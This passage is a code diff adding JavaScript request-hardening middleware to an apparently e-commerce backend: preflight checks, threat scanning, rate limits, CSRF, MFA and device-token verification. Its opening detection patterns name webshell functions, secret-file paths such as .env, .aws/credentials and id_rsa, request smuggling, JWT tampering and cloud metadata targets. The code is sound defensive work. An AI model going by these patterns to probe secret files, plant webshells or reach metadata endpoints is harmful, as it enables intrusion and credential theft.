+  Object.freeze(['request_smuggling', /transfer-encoding[\s\S]{0,120}transfer-encoding|content-length[\s\S]{0,120}content-length|content-length[\s\S]{0,120}transfer-encoding|transfer-encoding[\s\S]{0,120}content-length/i]),
+  Object.freeze(['upload_webshell', /\.(?:phtml|phar|jspx?|aspx?)(?:\b|$)|<\?php|\bbase64_decode\s*\(|\b(?:eval|shell_exec|system|passthru)\s*\(/i]),
+  Object.freeze(['secret_file_probing', /(?:^|[\/\\])\.(?:env|git|svn|hg)(?:[\/\\]|$)|\.aws[\/\\]credentials|\bid_rsa\b|\bwp-config\.php\b|(?:^|[\/\\])config\.php\b/i]),
+  Object.freeze(['graphql_introspection', /\b__schema\b|\b__type\b|\bintrospectionquery\b/i]),
+  Object.freeze(['jwt_tampering', /\beyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.?[A-Za-z0-9_-]*\b[\s\S]{0,200}\b(?:alg|jku|x5u|kid|none)\b/i])
+]);
+
+function diracCentralIsPreflightV221(ctx) {
+  return Boolean(ctx && String(ctx.method || '').toUpperCase() === 'OPTIONS');
+}
+
+function diracCentralPreflightRequestedHeadersV221(headers) {
+  const raw = String(headers && headers['access-control-request-headers'] || '').trim().toLowerCase();
+  if (!raw) return [];
+  return Array.from(new Set(raw.split(',').map((value) => value.trim()).filter(Boolean)));
+}
+
+function diracCentralValidatePreflightV221(ctx) {
+  if (!diracCentralIsPreflightV221(ctx)) return { ok: true, preflight: false };
+  const headers = ctx && ctx.headers || {};
+  const contract = diracCentralContractForActionV146(ctx.action);
+  const origin = diracCentralNormalizeOriginV146(headers.origin || '');
+  const requestedMethod = String(headers['access-control-request-method'] || '').trim().toUpperCase();
+  const requestedHeaders = diracCentralPreflightRequestedHeadersV221(headers);
+  if (!origin || !DIRAC_CENTRAL_ALLOWED_ORIGINS_V146.has(origin)) return { ok: false, reason: 'preflight_origin_invalid' };
+  if (!contract || !Array.isArray(contract.methods) || !contract.methods.length) return { ok: false, reason: 'preflight_contract_missing' };
+  if (!requestedMethod || requestedMethod === 'OPTIONS' || !contract.methods.includes(requestedMethod)) return { ok: false, reason: 'preflight_requested_method_invalid' };
+  if (requestedHeaders.length > 24 || requestedHeaders.some((name) => !/^[a-z0-9-]{1,64}$/.test(name) || !DIRAC_CENTRAL_PREFLIGHT_ALLOWED_HEADERS_V221.has(name))) {
+    return { ok: false, reason: 'preflight_requested_header_invalid' };
+  }
+  if (String(headers['access-control-request-private-network'] || '').toLowerCase() === 'true') {
+    return { ok: false, reason: 'preflight_private_network_rejected' };
+  }
+  if (Number(headers['content-length'] || 0) !== 0 || String(headers['transfer-encoding'] || '').trim()) {
+    return { ok: false, reason: 'preflight_body_not_empty' };
+  }
+  const secSite = String(headers['sec-fetch-site'] || '').toLowerCase();
+  const secMode = String(headers['sec-fetch-mode'] || '').toLowerCase();
+  if (secSite && !['same-origin', 'same-site'].includes(secSite)) return { ok: false, reason: 'preflight_sec_fetch_site_invalid' };
+  if (secMode && secMode !== 'cors') return { ok: false, reason: 'preflight_sec_fetch_mode_invalid' };
+  return {
+    ok: true,
+    preflight: true,
+    origin,
+    requestedMethod,
+    requestedHeaders: Object.freeze(requestedHeaders.slice())
+  };
+}
+
+
+function diracCentralPreflightContextHashV221(ctx) {
+  const headers = ctx && ctx.headers || {};
+  return crypto.createHash('sha256').update(JSON.stringify({
+    action: String(ctx && ctx.action || ''),
+    origin: String(ctx && ctx.preflightOriginV221 || diracCentralNormalizeOriginV146(headers.origin || '')),
+    requestedMethod: String(ctx && ctx.preflightRequestedMethodV221 || headers['access-control-request-method'] || '').toUpperCase(),
+    requestedHeaders: Array.from(ctx && ctx.preflightRequestedHeadersV221 || diracCentralPreflightRequestedHeadersV221(headers)).sort(),
+    secFetchMode: String(headers['sec-fetch-mode'] || '').toLowerCase()
+  })).digest('hex');
+}
+
+function diracCentralVerifyPreflightCheckpointV221(ctx, stageName) {
+  const stage = String(stageName || '');
+  const stageOffset = DIRAC_CENTRAL_PREFLIGHT_GUARD_STAGES_V221.indexOf(stage);
+  if (stageOffset < 0) return { ok: false, reason: 'preflight_checkpoint_name_invalid' };
+  if (!ctx || ctx.preflightValidatedV221 !== true || ctx.method !== 'OPTIONS') return { ok: false, reason: 'preflight_checkpoint_context_invalid' };
+  if (Number(ctx.currentStageIndexV211) !== stageOffset + 10) return { ok: false, reason: 'preflight_checkpoint_order_invalid_' + stage };
+  const validated = diracCentralValidatePreflightV221(ctx);
+  if (!validated.ok || validated.preflight !== true) return { ok: false, reason: validated.reason || 'preflight_checkpoint_revalidation_failed' };
+  const currentHash = diracCentralPreflightContextHashV221(ctx);
+  if (!ctx.preflightContextHashV221 || !safeEqual(String(ctx.preflightContextHashV221), currentHash)) return { ok: false, reason: 'preflight_context_mutation_detected' };
+  const headers = ctx.headers || {};
+  if (String(headers.authorization || headers.cookie || '').trim()) return { ok: false, reason: 'preflight_credentials_present' };
+  if (String(headers['transfer-encoding'] || '').trim() || Number(headers['content-length'] || 0) !== 0) return { ok: false, reason: 'preflight_body_transport_present' };
+  const requestedHeaders = new Set(ctx.preflightRequestedHeadersV221 || []);
+  if (stage === 'server_authentication') {
+    const internalHeaders = Object.keys(headers).filter((name) => /^x-dirac-(?:server|target-server|s2s|key-version|timestamp|nonce|request-id|body-sha512|signature)/i.test(name));
+    if (internalHeaders.length) return { ok: false, reason: 'preflight_s2s_header_present' };
+  }
+  if ((stage === 'csrf' || stage === 'page_nonce') && ctx.policy && ctx.policy.csrf === true) {
+    if (!requestedHeaders.has('x-csrf-token') && !requestedHeaders.has('x-dirac-csrf-token')) return { ok: false, reason: 'preflight_csrf_header_not_declared' };
+    if (!requestedHeaders.has('x-dirac-page-nonce') && !requestedHeaders.has('x-page-nonce')) return { ok: false, reason: 'preflight_page_nonce_header_not_declared' };
+  }
+  if (stage === 'a2f_signature' && ctx.policy && ctx.policy.a2f === true) {
+    for (const name of ['x-dirac-a2f-ticket', 'x-dirac-a2f-signature', 'x-dirac-a2f-timestamp', 'x-dirac-a2f-nonce']) {
+      if (!requestedHeaders.has(name)) return { ok: false, reason: 'preflight_a2f_header_not_declared_' + name };
+    }
+  }
+  const proofs = ctx.preflightCheckpointProofsV221 && typeof ctx.preflightCheckpointProofsV221 === 'object'
+    ? ctx.preflightCheckpointProofsV221
+    : (ctx.preflightCheckpointProofsV221 = Object.create(null));
+  if (Object.prototype.hasOwnProperty.call(proofs, stage)) return { ok: false, reason: 'preflight_checkpoint_replayed_' + stage };
+  const proof = crypto.createHash('sha256').update([ctx.requestId, ctx.action, stage, currentHash, String(ctx.currentStageIndexV211)].join('|')).digest('hex');
+  proofs[stage] = proof;
+  return { ok: true, proof };
+}
+
+function diracCentralPreflightStageResultV221(ctx, stageName) {
+  const checked = diracCentralVerifyPreflightCheckpointV221(ctx, stageName);
+  return checked.ok
+    ? diracV202StageResult(true, { decision: 'preflight_checkpoint_verified', preflight_proof: checked.proof })
+    : diracV202StageResult(false, { reason: checked.reason });
+}
+
+function diracCentralClassifyFailureV221(reason, stage, directCode) {
+  const value = String(reason || directCode || '').toLowerCase();
+  let failureClass = 'confirmed_security_violation';
+  let severity = 'high';
+  if (/mfa_required|authentication_required|login_required/.test(value)) {
+    failureClass = 'authentication_state';
+    severity = 'info';
+  } else if (/expired/.test(value)) {
+    failureClass = 'expired_security_credential';
+    severity = 'medium';
+  } else if (/rate|circuit|too_fast|surge/.test(value)) {
+    failureClass = 'abuse_rate_control';
+    severity = 'high';
+  } else if (/missing|invalid|not_allowed|not_in_contract|format|field_|body_|method_|origin_|referer_|content_type/.test(value)) {
+    failureClass = 'request_contract_violation';
+    severity = 'high';
+  } else if (/unavailable|storage|required|timeout|exception|error|missing_dependency/.test(value)) {
+    failureClass = 'security_dependency_failure';
+    severity = 'critical';
+  }
+  if (/sql|xss|ssrf|rce|injection|traversal|pollution|smuggling|webshell|tamper|replay|idor|bola|signature/.test(value)) {
+    failureClass = 'confirmed_attack';
+    severity = 'critical';
+  }
+  return Object.freeze({
+    patch: DIRAC_CENTRAL_HARDENING_V221,
+    stage: String(stage || '').slice(0, 80),
+    reason: String(reason || directCode || '').slice(0, 120),
+    failureClass,
+    severity
+  });
+}
+
+function diracCentralCanonicalVariantsV221(value) {
+  const variants = new Set();
+  const add = (input) => {
+    let text = String(input === undefined || input === null ? '' : input).slice(0, 12 * 1024);
+    if (!text) return;
+    try { text = text.normalize('NFKC'); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    variants.add(text);
+    variants.add(text.toLowerCase());
+    variants.add(text.replace(/\+/g, ' '));
+    variants.add(diracCentralHtmlEntityDecodeV146(text));
+    variants.add(text.replace(/\\u([0-9a-f]{4})/gi, (_, hex) => String.fromCharCode(parseInt(hex, 16))));
+  };
+  let current = String(value === undefined || value === null ? '' : value);
+  add(current);
+  for (let index = 0; index < 3; index += 1) {
+    try {
+      const decoded = decodeURIComponent(current);
+      add(decoded);
+      if (decoded === current) break;
+      current = decoded;
+    } catch (_) { break; }
+  }
+  return Array.from(variants).map((item) => String(item).slice(0, 12 * 1024));
+}
+
+function diracCentralThreatFieldsV221(req, ctx) {
+  const fields = [];
+  const push = (path, value, source) => {
+    const key = diracCentralNormalizeKeyV146(String(path || '').split('.').pop());
+    const sensitive = diracCentralSensitiveKeyV146(key);
+    const text = String(value === undefined || value === null ? '' : value);
+    fields.push(Object.freeze({
+      path: String(path || '').slice(0, 240),
+      key,
+      source: String(source || '').slice(0, 40),
+      sensitive,
+      value: sensitive ? '[redacted]' : text.slice(0, 12 * 1024)
+    }));
+  };
+  push('request.action', ctx && ctx.action, 'action');
+  push('request.url', diracCentralRedactSensitiveUrlV194(req && req.url), 'url');
+  Object.entries(req && req.query || {}).slice(0, 100).forEach(([key, value]) => {
+    if (Array.isArray(value)) value.slice(0, 20).forEach((item, index) => push('query.' + key + '.' + index, item, 'query'));
+    else push('query.' + key, value, 'query');
+  });
+  diracCentralFlattenObjectV146(ctx && ctx.body || {}, 0, '', 600).forEach((item) => push('body.' + item.key, item.value, 'body'));
+  const headers = req && req.headers || {};
+  [
+    'origin', 'referer', 'referrer', 'host', 'content-type', 'accept',
+    'access-control-request-method', 'access-control-request-headers',
+    'x-forwarded-host', 'x-forwarded-proto', 'transfer-encoding', 'content-length'
+  ].forEach((name) => push('header.' + name, headers[name], 'header'));
+  return fields.slice(0, 800);
+}
+
+function diracCentralUrlLikeFieldV221(field) {
+  return /(?:^|_)(?:url|uri|host|hostname|endpoint|callback|redirect|return|target|webhook|proxy|avatar|image|domain)(?:$|_)/i.test(String(field && field.key || ''))
+    || field && field.source === 'url';
+}
+
+function diracCentralContextualThreatGuardV221(req, ctx) {
+  const fields = diracCentralThreatFieldsV221(req, ctx);
+  for (const field of fields) {
+    const path = String(field.path || '');
+    const key = String(field.key || '');
+    if (/^(?:__proto__|prototype|constructor)$/.test(key) || /(?:^|\.)(?:__proto__|prototype)(?:\.|$)|constructor\.prototype/i.test(path)) {
+      return { detected: true, kind: 'prototype_pollution', field: path };
+    }
+    if (field.sensitive) continue;
+    const variants = diracCentralCanonicalVariantsV221(field.value);
+    for (const candidate of variants) {
+      if (/(?:^|[.\[\]{}\s'"])(?:__proto__|prototype)(?:$|[.\[\]{}\s'"])/i.test(candidate)
+          || /constructor\s*(?:\.|\[)\s*['"]?prototype/i.test(candidate)) {
+        return { detected: true, kind: 'prototype_pollution', field: path };
+      }
+      if (candidate.includes('\u0000') || /[‪-‮⁦-⁩]/.test(candidate)) {
+        return { detected: true, kind: 'unicode_control_or_bidi', field: path };
+      }
+      for (const [kind, pattern] of DIRAC_CENTRAL_HIGH_CONFIDENCE_THREATS_V221) {
+        pattern.lastIndex = 0;
+        if (pattern.test(candidate)) return { detected: true, kind, field: path };
+      }
+      if (diracCentralUrlLikeFieldV221(field)) {
+        let parsed = null;
+        try { parsed = new URL(candidate); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+        const host = parsed ? String(parsed.hostname || '').toLowerCase() : String(candidate || '').trim().toLowerCase();
+        if (parsed && !['https:', 'http:'].includes(parsed.protocol)) return { detected: true, kind: 'ssrf_protocol', field: path };
+        if (diracCentralIsUnsafeHostV146(host)
+            || /^(?:0x[0-9a-f]+|0[0-7]+|\d{8,})$/i.test(host)
+            || /(?:^|\/)(?:latest\/meta-data|metadata\/instance|computeMetadata\/v1)(?:\/|$)/i.test(candidate)
+            || /\b(?:metadata\.google\.internal|instance-data)\b/i.test(candidate)) {
+          return { detected: true, kind: 'ssrf_private_or_metadata_target', field: path };
+        }
+      }
+      if (/^(?:redirect|return|next|target|callback|continue|url)$/i.test(key) && /^(?:https?:)?\/\//i.test(candidate)) {
+        try {
+          const redirectUrl = new URL(candidate, 'https://diracgroup.store');
+          if (!DIRAC_CENTRAL_ALLOWED_ORIGINS_V146.has(redirectUrl.origin)) return { detected: true, kind: 'open_redirect', field: path };
+        } catch (_) {
+          return { detected: true, kind: 'open_redirect_invalid_url', field: path };
+        }
+      }
+    }
+  }
+  const mass = diracCentralMassAssignmentThreatV146(ctx);
+  if (mass.detected) return mass;
+  return { detected: false };
+}
+
+function diracCentralJsonDuplicateScanV221(raw) {
+  const text = String(raw || '');
+  let index = 0;
+  let tokens = 0;
+  const maxTokens = 10000;
+  const skip = () => { while (index < text.length && /\s/.test(text[index])) index += 1; };
+  const parseString = () => {
+    const start = index;
+    if (text[index] !== '"') throw new Error('json_string_expected');
+    index += 1;
+    let escaped = false;
+    while (index < text.length) {
+      const char = text[index++];
+      if (escaped) { escaped = false; continue; }
+      if (char === '\\') { escaped = true; continue; }
+      if (char === '"') return JSON.parse(text.slice(start, index));
+      if (char.charCodeAt(0) < 0x20) throw new Error('json_control_character');
+    }
+    throw new Error('json_string_unterminated');
+  };
+  const parsePrimitive = () => {
+    const match = /^(?:true|false|null|-?(?:0|[1-9]\d*)(?:\.\d+)?(?:[eE][+-]?\d+)?)/.exec(text.slice(index));
+    if (!match) throw new Error('json_primitive_invalid');
+    index += match[0].length;
+  };
+  const parseValue = (depth) => {
+    tokens += 1;
+    if (tokens > maxTokens || depth > 12) throw new Error('json_complexity_exceeded');
+    skip();
+    const char = text[index];
+    if (char === '"') { parseString(); return null; }
+    if (char === '{') return parseObject(depth + 1);
+    if (char === '[') return parseArray(depth + 1);
+    parsePrimitive();
+    return null;
+  };
+  const parseObject = (depth) => {
+    index += 1;
+    skip();
+    const keys = new Set();
+    if (text[index] === '}') { index += 1; return null; }
+    while (index < text.length) {
+      skip();
+      const key = parseString();
+      if (keys.has(key)) return { duplicate: true, key: String(key).slice(0, 120) };
+      keys.add(key);
+      skip();
+      if (text[index++] !== ':') throw new Error('json_colon_expected');
+      const nested = parseValue(depth);
+      if (nested && nested.duplicate) return nested;
+      skip();
+      const delimiter = text[index++];
+      if (delimiter === '}') return null;
+      if (delimiter !== ',') throw new Error('json_object_delimiter_invalid');
+    }
+    throw new Error('json_object_unterminated');
+  };
+  const parseArray = (depth) => {
+    index += 1;
+    skip();
+    if (text[index] === ']') { index += 1; return null; }
+    while (index < text.length) {
+      const nested = parseValue(depth);
+      if (nested && nested.duplicate) return nested;
+      skip();
+      const delimiter = text[index++];
+      if (delimiter === ']') return null;
+      if (delimiter !== ',') throw new Error('json_array_delimiter_invalid');
+    }
+    throw new Error('json_array_unterminated');
+  };
+  try {
+    skip();
+    const result = parseValue(0);
+    if (result && result.duplicate) return { ok: false, duplicate: true, key: result.key };
+    skip();
+    if (index !== text.length) return { ok: false, malformed: true, reason: 'json_trailing_data' };
+    return { ok: true };
+  } catch (error) {
+    return { ok: false, malformed: true, reason: String(error && error.message || 'json_invalid').slice(0, 120) };
+  }
+}
+
+function diracCentralPlainJsonStructureV221(value, depth, counters) {
+  if (depth > 8) return { ok: false, reason: 'schema_depth_exceeded' };
+  if (value === null || value === undefined || typeof value !== 'object') return { ok: true };
+  counters.nodes += 1;
+  if (counters.nodes > 1200) return { ok: false, reason: 'schema_node_count_exceeded' };
+  if (Object.getOwnPropertySymbols(value).length) return { ok: false, reason: 'schema_symbol_key_rejected' };
+  if (Array.isArray(value)) {
+    if (value.length > 100) return { ok: false, reason: 'schema_array_length_exceeded' };
+    for (const item of value) {
+      const result = diracCentralPlainJsonStructureV221(item, depth + 1, counters);
+      if (!result.ok) return result;
+    }
+    return { ok: true };
+  }
+  const prototype = Object.getPrototypeOf(value);
+  if (prototype !== Object.prototype && prototype !== null) return { ok: false, reason: 'schema_non_plain_object' };
+  const keys = Object.keys(value);
+  if (keys.length > 160) return { ok: false, reason: 'schema_object_width_exceeded' };
+  for (const key of keys) {
+    if (!/^[A-Za-z0-9_.-]{1,120}$/.test(key)) return { ok: false, reason: 'schema_key_invalid' };
+    if (/^(?:__proto__|prototype|constructor)$/.test(key)) return { ok: false, reason: 'schema_prototype_key_rejected' };
+    const result = diracCentralPlainJsonStructureV221(value[key], depth + 1, counters);
+    if (!result.ok) return result;
+  }
+  return { ok: true };
+}
+
+function diracCentralAdvancedContractGuardV221(req, ctx) {
+  const headers = req && req.headers || {};
+  const headerNames = Object.keys(headers);
+  if (headerNames.length > 100) return { ok: false, reason: 'header_count_exceeded' };
+  const totalHeaderBytes = headerNames.reduce((sum, name) => sum + Buffer.byteLength(String(name), 'utf8') + Buffer.byteLength(String(headers[name] || ''), 'utf8'), 0);
+  if (totalHeaderBytes > 32 * 1024) return { ok: false, reason: 'header_total_size_exceeded' };
+  if (String(headers['transfer-encoding'] || '').trim() && String(headers['content-length'] || '').trim()) return { ok: false, reason: 'content_length_transfer_encoding_conflict' };
+  if (req && req.__diracRawJsonDuplicateV221) return { ok: false, reason: 'duplicate_json_key_' + String(req.__diracRawJsonDuplicateV221).slice(0, 80) };
+  if (req && req.__diracRawJsonMalformedV221) return { ok: false, reason: 'raw_json_malformed' };
+  const source = ['GET', 'HEAD'].includes(ctx.method) ? (req && req.query || {}) : (ctx.body || {});
+  const structure = diracCentralPlainJsonStructureV221(source, 0, { nodes: 0 });
+  if (!structure.ok) return structure;
+  const contract = diracCentralContractForActionV146(ctx.action);
+  for (const [key, value] of Object.entries(req && req.query || {})) {
+    if (key === 'action') continue;
+    if (Array.isArray(value) && !(contract.allowArrayItems && (contract.allowed || []).includes(key))) return { ok: false, reason: 'duplicate_query_parameter_' + key };
+  }
+  if (!['GET', 'HEAD', 'OPTIONS'].includes(ctx.method)) {
+    const contentType = String(headers['content-type'] || '').split(';')[0].trim().toLowerCase();
+    if (Number(headers['content-length'] || 0) > 0 && contentType !== 'application/json') {
+      return { ok: false, reason: 'strict_json_content_type_required' };
+    }
+  }
+  if (ctx.body && typeof ctx.body === 'object' && Object.prototype.hasOwnProperty.call(ctx.body, 'action')) {
+    const bodyAction = String(ctx.body.action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
+    if (bodyAction && bodyAction !== ctx.action) return { ok: false, reason: 'body_action_context_mismatch' };
+  }
+  const numericKeys = /^(?:quantity|qty|limit|total|client_price|client_subtotal|amount|attempt_count|active_passkey_count)$/i;
+  for (const item of diracCentralFlattenObjectV146(source, 0, '', 800)) {
+    const key = String(item.key || '').split('.').pop();
+    const value = item.value;
+    if (numericKeys.test(key) && value !== '' && (!Number.isFinite(Number(value)) || Number(value) < 0)) return { ok: false, reason: 'numeric_field_invalid_' + key };
+    if (/^(?:email)$/i.test(key) && String(value || '').length > 320) return { ok: false, reason: 'email_length_invalid' };
+    if (/^(?:items)$/i.test(key) && value !== null && typeof value !== 'object') return { ok: false, reason: 'items_type_invalid' };
+  }
+  return { ok: true };
+}
+
+function diracCentralRateBucketV221(key, windowMs, max) {
+  const now = Date.now();
+  const cleanKey = String(key || '').slice(0, 300);
+  let row = DIRAC_CENTRAL_RATE_BUCKETS_V221.get(cleanKey);
+  if (!row || Number(row.resetAt || 0) <= now) row = { count: 0, resetAt: now + windowMs };
+  row.count += 1;
+  DIRAC_CENTRAL_RATE_BUCKETS_V221.set(cleanKey, row);
+  if (DIRAC_CENTRAL_RATE_BUCKETS_V221.size > 20000) diracCentralCleanupMapV146(DIRAC_CENTRAL_RATE_BUCKETS_V221, 20000, 12000);
+  return { ok: row.count <= max, count: row.count, resetAt: row.resetAt };
+}
+
+function diracCentralRateProfileV221(action) {
+  const clean = String(action || '');
+  const legacy = Math.max(1, Number(diracCentralDistributedRateLimitMaxV146(clean) || 1));
+  if (/login|register/.test(clean)) return { burst: Math.min(6, legacy), sustained: Math.min(legacy, 12), concurrent: 3 };
+  if (/mfa|passkey|recovery|email_verify/.test(clean)) return { burst: Math.min(5, legacy), sustained: Math.min(legacy, 10), concurrent: 3 };
+  if (/payment|checkout|order/.test(clean)) return { burst: Math.min(8, legacy), sustained: Math.min(legacy, 20), concurrent: 4 };
+  if (/^admin_/.test(clean)) return { burst: Math.min(4, legacy), sustained: Math.min(legacy, 10), concurrent: 2 };
+  if (/health|public|products|catalog|parfum/.test(clean)) return { burst: Math.min(30, legacy), sustained: Math.min(legacy, 60), concurrent: 12 };
+  return { burst: Math.min(20, legacy), sustained: Math.min(legacy, 60), concurrent: 8 };
+}
+
+function diracCentralLayeredRateGuardV221(req, ctx) {
+  const action = String(ctx && ctx.action || '');
+  const profile = diracCentralRateProfileV221(action);
+  const ip = String(typeof getLoginSecurityIp === 'function' ? getLoginSecurityIp(req) : 'unknown');
+  const ipKey = diracCentralHashV146('ip:' + ip);
+  const sessionKey = diracCentralRequestSessionHashV146(req) || 'anonymous';
+  const origin = diracCentralNormalizeOriginV146(ctx && ctx.headers && ctx.headers.origin || '') || 'no-origin';
+  const preflight = diracCentralIsPreflightV221(ctx);
+  const burstMax = preflight ? Math.max(20, profile.burst * 4) : profile.burst;
+  const sustainedMax = preflight ? Math.max(60, profile.sustained * 4) : profile.sustained;
+  const keys = [
+    ['ip-action', ipKey + ':' + action],
+    ['session-action', sessionKey + ':' + action],
+    ['origin-action', origin + ':' + action]
+  ];
+  for (const [scope, value] of keys) {
+    if (!diracCentralRateBucketV221('v221:burst:' + scope + ':' + value, 10 * 1000, burstMax).ok) return { ok: false, reason: 'v221_burst_rate_' + scope };
+    if (!diracCentralRateBucketV221('v221:sustained:' + scope + ':' + value, 60 * 1000, sustainedMax).ok) return { ok: false, reason: 'v221_sustained_rate_' + scope };
+  }
+  if (!diracCentralRateBucketV221('v221:global:' + action, 60 * 1000, Math.max(600, sustainedMax * 100)).ok) {
+    return { ok: false, reason: 'v221_global_action_rate' };
+  }
+  const leaseKey = 'v221:concurrent:' + ipKey + ':' + action;
+  const active = Number(DIRAC_CENTRAL_CONCURRENCY_V221.get(leaseKey) || 0);
+  if (active >= profile.concurrent) return { ok: false, reason: 'v221_concurrency_limit' };
+  DIRAC_CENTRAL_CONCURRENCY_V221.set(leaseKey, active + 1);
+  ctx.__diracRateLeaseV221 = leaseKey;
+  return { ok: true };
+}
+
+function diracCentralReleaseRateLeaseV221(ctx) {
+  const key = String(ctx && ctx.__diracRateLeaseV221 || '');
+  if (!key) return;
+  const active = Number(DIRAC_CENTRAL_CONCURRENCY_V221.get(key) || 0);
+  if (active <= 1) DIRAC_CENTRAL_CONCURRENCY_V221.delete(key);
+  else DIRAC_CENTRAL_CONCURRENCY_V221.set(key, active - 1);
+  ctx.__diracRateLeaseV221 = '';
+}
+
+function diracCentralCsrfPostVerifyV221(req, ctx) {
+  if (!diracCentralNeedsCsrfNonceV146(ctx)) return { ok: true };
+  const headers = req && req.headers || {};
+  const headerValues = [
+    headers['x-csrf-token'],
+    headers['x-dirac-csrf-token']
+  ].filter((value) => String(value || '').trim()).map(String);
+  if (headerValues.length > 1 && !headerValues.every((value) => typeof safeEqual === 'function' ? safeEqual(value, headerValues[0]) : value === headerValues[0])) {
+    return { ok: false, reason: 'csrf_multiple_sources_mismatch' };
+  }
+  const token = String(headerValues[0] || '').trim();
+  if (token && (!/^[A-Za-z0-9._~-]{32,4096}$/.test(token) || token.length > 4096)) return { ok: false, reason: 'csrf_token_shape_invalid' };
+  const query = req && req.query || {};
+  if (query.csrf || query.csrf_token || query.token) return { ok: false, reason: 'csrf_token_in_query_rejected' };
+  if (ctx.body && Object.prototype.hasOwnProperty.call(ctx.body, 'action')) {
+    const bodyAction = String(ctx.body.action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
+    if (bodyAction && bodyAction !== ctx.action) return { ok: false, reason: 'csrf_action_binding_mismatch' };
+  }
+  return { ok: true };
+}
+
+function diracCentralMfaEnvelopeV221(req, ctx) {
+  let proof;
+  let payload;
+  try {
+    proof = typeof getCustomerDashboardMfaToken === 'function' ? getCustomerDashboardMfaToken(req) : { token: '', source: 'dependency_missing' };
+    if (!proof || !proof.token) return { ok: false, expected: true, reason: 'mfa_required' };
+    payload = typeof decodeCustomerDashboardMfaToken === 'function' ? decodeCustomerDashboardMfaToken(proof.token) : null;
+  } catch (_) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_verification_error' };
+  }
+  if (!payload || payload.type !== CUSTOMER_MFA_SESSION_TYPE) return { ok: false, expected: false, reason: 'mfa_envelope_signature_invalid' };
+  const now = Date.now();
+  if (!Number.isSafeInteger(Number(payload.activeAtMs)) || !Number.isSafeInteger(Number(payload.expiresAtMs))
+      || Number(payload.activeAtMs) > now + 60 * 1000 || Number(payload.expiresAtMs) <= now
+      || Number(payload.expiresAtMs) - Number(payload.activeAtMs) > 60 * 60 * 1000) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_time_invalid' };
+  }
+  if (!/^[A-Za-z0-9_-]{16,160}$/.test(String(payload.jti || ''))) return { ok: false, expected: false, reason: 'mfa_envelope_jti_invalid' };
+  const sessionHash = diracCentralRequestSessionHashV146(req);
+  if (!sessionHash || !payload.sessionHash || !(typeof safeEqual === 'function' ? safeEqual(String(payload.sessionHash), sessionHash) : String(payload.sessionHash) === sessionHash)) {
+    return { ok: false, expected: false, reason: 'mfa_envelope_session_mismatch' };
+  }
+  if (payload.originHash) {
+    const expectedOrigin = customerMfaBindingHash('origin', requestOrigin(req));
+    if (!expectedOrigin || !(typeof safeEqual === 'function' ? safeEqual(String(payload.originHash), expectedOrigin) : String(payload.originHash) === expectedOrigin)) {
+      return { ok: false, expected: false, reason: 'mfa_envelope_origin_mismatch' };
+    }
+  }
+  if (payload.uaHash) {
+    const expectedUa = customerMfaBindingHash('ua', requestUserAgent(req));
+    if (!expectedUa || !(typeof safeEqual === 'function' ? safeEqual(String(payload.uaHash), expectedUa) : String(payload.uaHash) === expectedUa)) {
+      return { ok: false, expected: false, reason: 'mfa_envelope_device_mismatch' };
+    }
+  }
+  return { ok: true, payload };
+}
+
+function diracCentralMfaRequiredResponseV221(res, ctx) {
+  diracCentralApplyHeadersV146(res);
+  return res.status(403).json({
+    ok: false,
+    code: 'MFA_REQUIRED',
+    mfaRequired: true,
+    next: 'mfa_required',
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    message: 'Verifikasi keamanan diperlukan sebelum membuka data ini.'
+  });
+}
+
+function diracCentralDeviceCookieNameV221() {
+  return diracCentralIsProductionV146() ? '__Host-dirac_cg_device_v221' : 'dirac_cg_device_v221';
+}
+
+function diracCentralDeviceFingerprintV221(req) {
+  const headers = req && req.headers || {};
+  return diracCentralHashV146([
+    String(headers['user-agent'] || '').slice(0, 512),
+    diracCentralNormalizeOriginV146(headers.origin || headers.referer || headers.referrer || ''),
+    String(headers['sec-ch-ua'] || '').slice(0, 300),
+    String(headers['sec-ch-ua-platform'] || '').slice(0, 100),
+    String(headers['accept-language'] || '').slice(0, 160)
+  ].join('|'));
+}
+
+function diracCentralDeviceTokenV221(req) {
+  const now = Date.now();
+  const payload = {
+    typ: DIRAC_CENTRAL_HARDENING_V221,
+    session: diracCentralRequestSessionHashV146(req),
+    device: diracCentralDeviceFingerprintV221(req),
+    iat: now,
+    exp: now + 24 * 60 * 60 * 1000,
+    jti: crypto.randomBytes(18).toString('base64url')
+  };
+  const encoded = Buffer.from(JSON.stringify(payload)).toString('base64url');
+  const signature = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-v221')).update(encoded).digest('base64url');
+  return encoded + '.' + signature;
+}
+
+function diracCentralVerifyDeviceTokenV221(req, token) {
+  const parts = String(token || '').split('.');
+  if (parts.length !== 2 || !parts[0] || !parts[1]) return { ok: false, reason: 'device_credential_shape_invalid' };
+  const expected = crypto.createHmac('sha512', diracCentralDeriveSecretV146('central-device-v221')).update(parts[0]).digest('base64url');
+  if (!(typeof safeEqual === 'function' ? safeEqual(parts[1], expected) : parts[1] === expected)) return { ok: false, reason: 'device_credential_signature_invalid' };
+  let payload;
+  try { payload = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8')); } catch (_) { return { ok: false, reason: 'device_credential_payload_invalid' }; }
+  if (!payload || payload.typ !== DIRAC_CENTRAL_HARDENING_V221 || Number(payload.exp || 0) <= Date.now()) return { ok: false, reason: 'device_credential_expired' };
+  const session = diracCentralRequestSessionHashV146(req);
+  const device = diracCentralDeviceFingerprintV221(req);
+  if (!session || !payload.session || !(typeof safeEqual === 'function' ? safeEqual(String(payload.session), session) : String(payload.session) === session)) return { ok: false, reason: 'device_credential_session_mismatch' };
+  if (!payload.device || !(typeof safeEqual === 'function' ? safeEqual(String(payload.device), device) : String(payload.device) === device)) return { ok: false, reason: 'device_credential_fingerprint_mismatch' };
+  return { ok: true, payload };
+}
+
+function diracCentralDeviceCredentialGuardV221(req, res, ctx) {
+  if (!DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(ctx.action) && !/^domain_dashboard|^customer_security|^admin_security/.test(ctx.action)) return { ok: true };
+  const session = diracCentralRequestSessionHashV146(req);
